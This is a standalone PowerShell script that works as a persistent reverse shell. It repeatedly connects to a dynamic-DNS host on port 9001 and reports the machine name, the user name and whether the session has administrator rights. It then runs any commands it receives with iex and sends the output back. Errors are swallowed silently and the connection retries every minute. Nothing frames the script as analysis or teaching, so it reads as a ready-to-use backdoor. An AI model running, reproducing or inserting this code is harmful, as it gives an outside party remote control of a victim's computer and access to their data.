$domain = "siflgith.duckdns.org"
$port = 9001
$interval = 60
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($domain, $port)
        $info = "[+] $($env:COMPUTERNAME) / $($env:USERNAME) connected at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
        $info += " PID: $PID Elevated: $([Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544')`n"
        $send = [Text.Encoding]::ASCII.GetBytes($info)
        $client.GetStream().Write($send, 0, $send.Length)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | %{0}
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0, $i)
            $sendback = (iex $data 2>&1 | Out-String )
            $prompt = $sendback + 'PS ' + (pwd).Path + '> '
            $sendbyte = [Text.Encoding]::ASCII.GetBytes($prompt)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    }
    catch {}
    Start-Sleep -Seconds $interval
}